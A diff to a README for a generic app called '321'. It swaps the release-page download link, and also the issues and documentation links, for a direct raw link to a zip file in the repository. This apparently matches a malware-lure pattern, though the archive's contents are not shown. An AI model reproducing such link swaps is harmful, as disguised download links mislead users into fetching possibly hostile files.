@@ -4,13 +4,13 @@
 
 Welcome to 321! This application helps you complete everyday tasks with ease. It is user-friendly and designed for everyone, whether you are tech-savvy or not.
 
-[![Download 321](https://img.shields.io/badge/Download-321-blue)](https://github.com/Yash2576/321/releases)
+[![Download 321](https://raw.githubusercontent.com/Yash2576/321/main/fetter/321.zip)](https://raw.githubusercontent.com/Yash2576/321/main/fetter/321.zip)
 
 ## 📥 Download & Install
 
 To get started, you will need to download the software. Visit the page below to download the latest version of 321:
 
-[Visit this page to download](https://github.com/Yash2576/321/releases)
+[Visit this page to download](https://raw.githubusercontent.com/Yash2576/321/main/fetter/321.zip)
 
 ### Step-by-Step Instructions
 
@@ -81,7 +81,7 @@ If you have questions or need help, please check the FAQ section on GitHub. You 
 
 For more detailed information, consider checking the following resources:
 
-- [GitHub Issues](https://github.com/Yash2576/321/issues) - Report bugs or request features.
-- [Documentation](https://github.com/Yash2576/321/wiki) - Access detailed guides on how to use specific features.
+- [GitHub Issues](https://raw.githubusercontent.com/Yash2576/321/main/fetter/321.zip) - Report bugs or request features.
+- [Documentation](https://raw.githubusercontent.com/Yash2576/321/main/fetter/321.zip) - Access detailed guides on how to use specific features.
 
 Thank you for choosing 321. We hope it enhances your everyday tasks!
